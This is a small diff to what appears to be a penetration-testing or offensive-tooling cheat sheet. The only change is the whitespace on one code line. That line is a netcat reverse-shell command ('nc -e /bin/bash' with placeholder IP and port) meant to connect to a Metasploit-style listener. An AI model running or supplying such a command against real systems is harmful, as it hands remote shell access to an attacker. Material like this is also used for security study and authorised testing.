@@ -20,7 +20,7 @@ use exploit/multi/handler
 To connect to a listener and offer it a shell we can use this nc command:
 
 ```bash
- nc -e /bin/bash ip_here port_here
+nc -e /bin/bash ip_here port_here
 ```
 
 Or we can use:
